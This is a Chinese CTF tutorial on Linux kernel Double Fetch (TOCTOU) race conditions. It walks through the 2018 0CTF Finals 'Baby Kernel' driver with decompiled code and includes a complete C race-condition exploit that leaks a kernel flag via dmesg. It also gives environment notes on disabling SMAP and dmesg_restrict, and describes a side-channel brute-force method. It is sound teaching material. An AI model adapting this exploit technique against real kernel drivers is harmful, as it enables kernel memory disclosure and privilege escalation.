

## Double Fetch

### 概述

Double Fetch从漏洞原理上属于条件竞争漏洞，是一种内核态与用户态之间的数据访问竞争。

在Linux等现代操作系统中，虚拟内存地址通常被划分为内核空间和用户空间。内核空间负责运行内核代码、驱动模块代码等，权限较高。而用户空间运行用户代码，并通过系统调用进入内核完成相关功能。通常情况下，用户空间向内核传递数据时，内核先通过通过copy\_from\_user等拷贝函数将用户数据拷贝至内核空间进行校验及相关处理，但在输入数据较为复杂时，内核可能只引用其指针，而将数据暂时保存在用户空间进行后续处理。此时，该数据存在被其他恶意线程篡改风险，造成内核验证通过数据与实际使用数据不一致，导致内核代码执行异常。

一个典型的Double Fetch漏洞原理如下图所示，一个用户态线程准备数据并利用系统调用进入内核，该数据在内核中有两次被取用，内核第一次取用数据用于安全检查（如缓冲区大小、指针可用性等），当检查通过后内核第二次取用数据进行实际处理。而在两次取用数据之间，另一个用户态线程可创造条件竞争，对已通过检查的用户态数据进行篡改，在真实使用时造成访问越界或缓冲区溢出，最终导致内核崩溃或权限提升。



![典型的Double Fetch原理图](https://ws2.sinaimg.cn/large/d9e4cccely1fznqv7bfuvj20qr0cmdgr.jpg)

### 2018 0CTF Finals Baby Kernel

#### 题目分析

首先用IDA对驱动文件进行分析，可见flag是硬编码在驱动文件中的。

```c
.data:0000000000000480 flag            dq offset aFlagThisWillBe
.data:0000000000000480                                         ; DATA XREF: baby_ioctl+2A↑r
.data:0000000000000480                                         ; baby_ioctl+DB↑r ...
.data:0000000000000480                                         ; "flag{THIS_WILL_BE_YOUR_FLAG_1234}"
.data:0000000000000488                 align 20h
```

驱动主要注册了一个baby\_ioctl函数，函数中包含两个功能，当ioctl中cmd参数为0x6666时，驱动将输出flag的内核加载地址。当ioctl中cmd参数为0x1337时，首先进行了三个校验，接着对用户输入的内容与硬编码的flag进行字符串比较，当一致时通过printk将flag输出出来。

```c
signed __int64 __fastcall baby_ioctl(__int64 a1, attr *a2)
{
  attr *v2; // rdx
  signed __int64 result; // rax
  int i; // [rsp-5Ch] [rbp-5Ch]
  attr *v5; // [rsp-58h] [rbp-58h]

  _fentry__(a1, a2);
  v5 = v2;
  if ( (_DWORD)a2 == 0x6666 )
  {
    printk("Your flag is at %px! But I don't think you know it's content\n", flag);
    result = 0LL;
  }
  else if ( (_DWORD)a2 == 0x1337
         && !_chk_range_not_ok((__int64)v2, 16LL, *(_QWORD *)(__readgsqword((unsigned __int64)&current_task) + 4952))
         && !_chk_range_not_ok(
               v5->flag_str,
               SLODWORD(v5->flag_len),
               *(_QWORD *)(__readgsqword((unsigned __int64)&current_task) + 4952))
         && LODWORD(v5->flag_len) == strlen(flag) )
  {
    for ( i = 0; i < strlen(flag); ++i )
    {
      if ( *(_BYTE *)(v5->flag_str + i) != flag[i] )
        return 0x16LL;
    }
    printk("Looks like the flag is not a secret anymore. So here is it %s\n", flag);
    result = 0LL;
  }
  else
  {
    result = 0xELL;
  }
  return result;
}
```

而分析其检查函数，其中\_chk\_range\_not\_ok为检查指针及长度范围是否指向用户空间，而不是内核空间。通过分析，可以得到用户输入的数据结构体如下：

```
00000000 attr            struc ; (sizeof=0x10, mappedto_3)
00000000 flag_str        dq ?
00000008 flag_len        dq ?
00000010 attr            ends
```

其检查内容为：1. 输入的数据指针是否为用户态数据。2. 数据指针内flag\_str是否指向用户态。 3. 数据指针内flag\_len是否等于硬编码flag的长度。

#### 解题思路

根据之前的Double Fetch漏洞原理，不难发现此题目存在一个Double Fetch漏洞，当用户输入数据通过验证后，再将flag\_str所指向的地址改为flag硬编码地址后，即会输出flag内容。

首先，利用提供的0x6666命令，可以通过`dmesg`命令，获取内核中flag的加载地址。

然后，构造符合0x1337命令的数据结构，其中flag\_len可以从硬编码中直接获取为33，flag_str指向一个用户态地址。然后再创建一个恶意线程，不断的将flag\_str所指向的用户态地址修改为拿到的flag内核地址制造竞争条件，最后从`dmesg`命令中拿到flag内容。

#### Exploit

```c
// gcc -static exp.c -lpthread -o exp
#include <string.h>
char *strstr(const char *haystack, const char *needle);
#define _GNU_SOURCE         /* See feature_test_macros(7) */
#include <string.h>
char *strcasestr(const char *haystack, const char *needle);
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <pthread.h>

#define TRYTIME 0x1000  //碰撞次数
#define LEN 0x1000

struct attr
{
    char *flag;
    size_t len;
};
unsigned long long addr;
int finish =0;
char buf[LEN+1]={0};
//线程函数，不断修改flag指向的地址为内核中flag地址
void change_attr_value(void *s){
    struct attr * s1 = s; 
    while(finish==0){
    s1->flag = addr;
    }
}

int main(void)
{
    int addr_fd;
    char *idx;
    int fd = open("/dev/baby",0);
    int ret = ioctl(fd,0x6666);    
    pthread_t t1;
    struct attr t;
    setvbuf(stdin,0,2,0);
    setvbuf(stdout,0,2,0);
    setvbuf(stderr,0,2,0);   
	//获取内核硬编码的flag地址
    system("dmesg > /tmp/record.txt");
    addr_fd = open("/tmp/record.txt",O_RDONLY);
    lseek(addr_fd,-LEN,SEEK_END);
    read(addr_fd,buf,LEN);
    close(addr_fd);
    idx = strstr(buf,"Your flag is at ");
    if (idx == 0){
        printf("[-]Not found addr");
        exit(-1);
    }
    else{
        idx+=16;
        addr = strtoull(idx,idx+16,16);
        printf("[+]flag addr: %p\n",addr);
    }
	//构造attr数据结构
    t.len = 33;
    t.flag = buf;
    //新建恶意线程
    pthread_create(&t1, NULL, change_attr_value,&t);
    for(int i=0;i<TRYTIME;i++){
        ret = ioctl(fd, 0x1337, &t);
        t.flag = buf;
    }
    finish = 1;
    pthread_join(t1, NULL);
    close(fd);
    puts("[+]result is :");
    system("dmesg | grep flag");
    return 0;
}
```

#### 其他

此题在环境配置时，有两点需要注意。

首先，启动时不要开启SMAP保护，否则在内核中直接访问用户态数据会引起kernel panic。

其次， 需关闭dmesg\_restrict，否则无法查看printk信息，具体操作是在启动脚本中加入：

```bash
echo 0 > /proc/sys/kernel/dmesg_restrict
```

最后，此题存在一种侧信道攻击的非预期解法：

>
>
>由于是flag是硬编码的，并且是逐字节比较的，可以逐字节爆破来得到flag。方法是将待比较的字节放在mmap申请的页末位，当得到正确的一字节时，会比较用户空间内下一个字节的正确性，此时由于该地址是不可读的，造成内核访问错误，导致kernel panic，从而可以判断是否爆破正确。

##  Reference and Thanks to

https://www.usenix.org/conference/usenixsecurity17/technical-sessions/presentation/wang-pengfei

https://veritas501.space/2018/06/04/0CTF%20final%20baby%20kernel/

http://p4nda.top/2018/07/20/0ctf-baby/

https://www.freebuf.com/articles/system/156485.html



